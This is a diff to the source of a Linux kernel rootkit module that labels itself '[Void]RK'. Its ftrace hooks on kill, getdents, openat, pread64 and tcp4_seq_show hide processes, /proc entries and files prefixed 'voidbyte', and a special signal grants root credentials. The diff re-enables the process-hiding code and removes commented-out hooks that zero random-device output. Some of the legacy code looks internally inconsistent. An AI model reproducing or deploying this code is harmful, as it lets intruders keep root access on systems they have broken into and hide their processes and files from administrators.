@@ -7,16 +7,21 @@
 #include <linux/kallsyms.h>
 #include <asm/uaccess.h>
 #include <linux/uaccess.h>
-#include <linux/sched.h>
+#include<linux/sched.h>
+#include <linux/proc_fs.h>
+#include <linux/proc_ns.h>
 #include <linux/dirent.h>
+#include <linux/unistd.h>
 #include <linux/tcp.h>
+#include <linux/file.h>
+#include <linux/fdtable.h>
 #include <linux/ftrace.h>
 #include "utmp.h"
 #include "ftrace_helper.h"
 
-//#define PREFIX "voidbyte"
+#define PREFIX "voidbyte"
 #define HIDDEN_USER "root"
-//#define PF_INVISIBLE 0x10000000
+#define PF_INVISIBLE 0x10000000
 
 enum {
     SIGINVIS = 31,
@@ -34,11 +39,8 @@ MODULE_VERSION("0.0.1");
 #endif
 
 int tamper_fd;
-char hide_pid[NAME_MAX];
 
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
-//static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
-//static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
 
 static struct list_head *prev_module;
 static short hidden = 0;
@@ -53,20 +55,17 @@ static asmlinkage long (*orig_pread64)(const struct pt_regs *);
 asmlinkage int hook_kill(const struct pt_regs *regs){
     void set_root(void);
     void showme(void);
+    void hideme(void);
     struct task_struct *task;
     struct task_struct * find_task(pid_t pid);
     pid_t pid = (pid_t)regs->di;
     int sig=(int)regs->si;
     switch(sig){
         case SIGINVIS:
-            /*
             if((task=find_task(pid))==NULL){
                 return -ESRCH;
             }
             task->flags ^= PF_INVISIBLE;
-            */
-            printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
-            sprintf(hide_pid, "%d", pid);
             break;
         case SIGSUPER:
             printk(KERN_INFO "[Void]RK: giving root...\n");
@@ -79,53 +78,66 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
         default:
             return orig_kill(regs);
     }
+    return 0;
 }
 
 asmlinkage int hook_getdents64(const struct pt_regs *regs){
+    int is_invis(pid_t pid);
+    int fd = (int) regs->di;
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+    struct inode *d_inode;
     unsigned long offset = 0;
-    int ret = orig_getdents64(regs);
-    dirent_ker = kzalloc(ret, GFP_KERNEL);
+    unsigned short proc = 0;
+    int ret = orig_getdents64(regs),err;
 
-    if ((ret <= 0) || (dirent_ker == NULL)){
+    if(ret <= 0){
         return ret;
     }
-    long error;
-    error = copy_from_user(dirent_ker, dirent, ret);
-    if (error){
-        goto done;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if(kdirent==NULL){
+        return ret;
+    }
+    err = copy_from_user(kdirent,dirent,ret);
+    if(err){
+        goto out;
+    }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
+        proc = 1;
     }
     while (offset < ret){
-        current_dir = (void *)dirent_ker + offset;
-        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
-        {
-            if (current_dir == dirent_ker)
-            {
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+        dir = (void *)kdirent + offset;
+       if ((!proc && (memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0)) || (proc && is_invis(simple_strtoul(dir->d_name, NULL, 10)))) {
+            if (dir == kdirent) {
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
                 continue;
             }
-            previous_dir->d_reclen += current_dir->d_reclen;
+            prev->d_reclen += dir->d_reclen;
+        } else {
+            prev = dir;
         }
-        else
-        {
-            previous_dir = current_dir;
-        }
-        offset += current_dir->d_reclen;
+        offset += dir->d_reclen;
     }
-    error = copy_to_user(dirent, dirent_ker, ret);
-    if (error){
-        goto done;
+    err = copy_to_user(dirent, kdirent, ret);
+    if(err){
+        goto out;
     }
-
-done:
-    kfree(dirent_ker);
+out:
+    kfree(kdirent);
     return ret;
 
 }
 
 asmlinkage int hook_getdents(const struct pt_regs *regs){
+    int fd = (int) regs->di;
+    int is_invis(pid_t pid);
     struct linux_dirent {
         unsigned long d_ino;
         unsigned long d_off;
@@ -133,49 +145,60 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
         char d_name[];
     };
     struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
-    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
+    struct linux_dirent *dir, *kdirent, *prev = NULL;
+    struct inode *d_inode;
     unsigned long offset = 0;
-    int ret = orig_getdents(regs);
-    dirent_ker = kzalloc(ret, GFP_KERNEL);
+    unsigned short proc = 0;
+    int ret = orig_getdents(regs), err;
 
-    if ((ret <= 0) || (dirent_ker == NULL)){
+    if(ret<=0){
         return ret;
     }
-    long error;
-    error = copy_from_user(dirent_ker, dirent, ret);
-    if (error){
-        goto done;
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if(kdirent==NULL){
+        return ret;
     }
+    err = copy_from_user(kdirent,dirent,ret);
+    if(err){
+        goto out;
+    }
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
+        proc = 1;
+    }
+
     while (offset < ret)
     {
-        current_dir = (void *)dirent_ker + offset;
-        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
-        {
-            if (current_dir == dirent_ker)
-            {
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+        dir = (void *)kdirent + offset;
+        if ((!proc && 
+        (memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0)) || (proc && is_invis(simple_strtoul(dir->d_name, NULL, 10)))) {
+            if(dir == kdirent){
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
                 continue;
             }
-            previous_dir->d_reclen += current_dir->d_reclen;
+            prev->d_reclen += dir->d_reclen;
+        } else {
+            prev=dir;
         }
-        else
-        {
-            previous_dir = current_dir;
-        }
-        offset += current_dir->d_reclen;
+        offset += dir->d_reclen;
     }
-    error = copy_to_user(dirent, dirent_ker, ret);
-    if (error){
-        goto done;
+    err=copy_to_user(dirent, kdirent, ret);
+    if(err){
+        goto out;
     }
-done:
-    kfree(dirent_ker);
+out:
+    kfree(kdirent);
     return ret;
 }
 
 asmlinkage int hook_openat(const struct pt_regs *regs){
-
     char *filename = (char *)regs->si;
     char *kbuf;
     long error;
@@ -200,7 +223,6 @@ asmlinkage int hook_openat(const struct pt_regs *regs){
 }
 
 asmlinkage int hook_pread64(const struct pt_regs *regs){
-
     int fd = regs->di;
     char *buf = (char *)regs->si;
     size_t count = regs->dx;
@@ -245,19 +267,16 @@ static asmlinkage long (*orig_pread64)(int fd, const __user *buf, size_t count, 
 static asmlinkage int hook_kill(pid_t pid, int sig){
     void set_root(void);
     void showme(void);
+    void hideme(void);
     struct task_struct *task;
     struct task_struct * find_task(pid_t pid);
     int sig=(int)regs->si;
     switch(sig){
         case SIGINVIS:
-            /*
             if((task=find_task(pid))==NULL){
                 return -ESRCH;
             }
             task->flags ^= PF_INVISIBLE;
-            */
-            printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
-            sprintf(hide_pid, "%d", pid);
             break;
         case SIGSUPER:
             printk(KERN_INFO "[Void]RK: giving root...\n");
@@ -273,93 +292,114 @@ static asmlinkage int hook_kill(pid_t pid, int sig){
 }
 
 static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
-    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    int is_invis(pid_t pid);
+    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+    struct inode *d_inode;
     unsigned long offset = 0;
-    int ret = orig_getdents64(fd, dirent, count);
-    dirent_ker = kzalloc(ret, GFP_KERNEL);
+    unsigned short proc = 0;
+    int ret = orig_getdents(fd,dirent,count),err;
 
-    if ((ret <= 0) || (dirent_ker == NULL)){
+    if(ret <= 0){
         return ret;
     }
-    long error;
-    error = copy_from_user(dirent_ker, dirent, ret);
-    if (error){
-        goto done;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if(kdirent==NULL){
+        return ret;
     }
-    while (offset < ret)
-    {
-        current_dir = (void *)dirent_ker + offset;
-        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
-        {
-            if (current_dir == dirent_ker)
-            {
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+    err = copy_from_user(kdirent,dirent,ret);
+    if(err){
+        goto out;
+    }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
+        proc = 1;
+    }
+    while (offset < ret){
+        dir = (void *)kdirent + offset;
+       if ((!proc && (memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0)) || (proc && is_invis(simple_strtoul(dir->d_name, NULL, 10)))) {
+            if (dir == kdirent) {
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
                 continue;
             }
-            previous_dir->d_reclen += current_dir->d_reclen;
+            prev->d_reclen += dir->d_reclen;
+        } else {
+            prev = dir;
         }
-        else
-        {
-            previous_dir = current_dir;
-        }
-        offset += current_dir->d_reclen;
+        offset += dir->d_reclen;
     }
-    error = copy_to_user(dirent, dirent_ker, ret);
-    if (error){
-        goto done;
+    err = copy_to_user(dirent, kdirent, ret);
+    if(err){
+        goto out;
     }
-done:
-    kfree(dirent_ker);
+out:
+    kfree(kdirent);
     return ret;
 }
 
 static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
+    int is_invis(pid_t pid);
     struct linux_dirent {
         unsigned long d_ino;
         unsigned long d_off;
         unsigned short d_reclen;
         char d_name[];
     };
-    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
+    struct linux_dirent *dir, *kdirent, *prev = NULL;
+    struct inode *d_inode;
     unsigned long offset = 0;
-    int ret = orig_getdents(fd, dirent, count);
-    dirent_ker = kzalloc(ret, GFP_KERNEL);
+    unsigned short proc = 0;
+    int ret = orig_getdents(fd,dirent,count), err;
 
-    if ((ret <= 0) || (dirent_ker == NULL)){
+    if(ret<=0){
         return ret;
     }
-    long error;
-    error = copy_from_user(dirent_ker, dirent, ret);
-    if (error){
-        goto done;
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if(kdirent==NULL){
+        return ret;
     }
-    while (offset < ret)
-    {
-        current_dir = (void *)dirent_ker + offset;
-        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
-        {
-            if (current_dir == dirent_ker)
-            {
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-                continue;
-            }
-            previous_dir->d_reclen += current_dir->d_reclen;
-        }
-        else
-        {
-            previous_dir = current_dir;
-        }
-        offset += current_dir->d_reclen;
-    }
-    error = copy_to_user(dirent, dirent_ker, ret);
-    if (error){
-        goto done;
+    err = copy_from_user(kdirent,dirent,ret);
+    if(err){
+        goto out;
     }
 
-done:
-    kfree(dirent_ker);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
+        proc = 1;
+    }
+
+    while (offset < ret)
+    {
+        dir = (void *)kdirent + offset;
+        if ((!proc && 
+        (memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0)) || (proc && is_invis(simple_strtoul(dir->d_name, NULL, 10)))) {
+            if(dir == kdirent){
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
+                continue;
+            }
+            prev->d_reclen += dir->d_reclen;
+        } else {
+            prev=dir;
+        }
+        offset += dir->d_reclen;
+    }
+    err=copy_to_user(dirent, kdirent, ret);
+    if(err){
+        goto out;
+    }
+out:
+    kfree(kdirent);
     return ret;
 }
 
@@ -436,61 +476,6 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
     return ret;
 }
 
-//Needs fixes
-/*static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
-{
-    int bytes_read, i;
-    long error;
-    char *kbuf = NULL;
-
-    bytes_read = orig_random_read(file, buf, nbytes, ppos);
-    printk(KERN_DEBUG "[Void]RK: intercepted read to /dev/random: %d bytes\n", bytes_read);
-    kbuf = kzalloc(bytes_read, GFP_KERNEL);
-    error = copy_from_user(kbuf, buf, bytes_read);
-    if(error){
-        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into kbuf\n", error);
-        kfree(kbuf);
-        return bytes_read;
-    }
-    for (i = 0 ;i < bytes_read;i++){
-        kbuf[i] = 0x00;
-    }
-    error = copy_to_user(buf, kbuf, bytes_read);
-    if (error)
-        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into buf\n", error);
-
-    kfree(kbuf);
-    return bytes_read;
-}
-
-static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
-{
-    int bytes_read, i;
-    long error;
-    char *kbuf = NULL;
-
-    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
-    printk(KERN_DEBUG "[Void]RK: intercepted call to /dev/urandom: %d bytes", bytes_read);
-
-    kbuf = kzalloc(bytes_read, GFP_KERNEL);
-    error = copy_from_user(kbuf, buf, bytes_read);
-
-    if(error){
-        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into kbuf\n", error);
-        kfree(kbuf);
-        return bytes_read;
-    }
-    for (i = 0 ;i < bytes_read;i++){
-        kbuf[i] = 0x00;
-    }
-    error = copy_to_user(buf, kbuf, bytes_read);
-    if (error){
-        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into buf\n", error);
-    }
-    kfree(kbuf);
-    return bytes_read;
-} */
-
 void set_root(void){
     struct cred *root;
     root = prepare_creds();
@@ -505,7 +490,6 @@ void set_root(void){
     commit_creds(root);
 }
 
-/*
 struct task_struct * find_task(pid_t pid){
     struct task_struct *p = current;
     for_each_process(p){
@@ -530,7 +514,6 @@ int is_invis(pid_t pid){
     }
     return 0;
 }
-*/
 
 static inline void tidy(void)
 {
@@ -554,8 +537,6 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64",hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents",hook_getdents, &orig_getdents),
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-    //HOOK("random_read", hook_random_read, &orig_random_read),
-    //HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("__x64_sys_openat", hook_openat, &orig_openat),
     HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
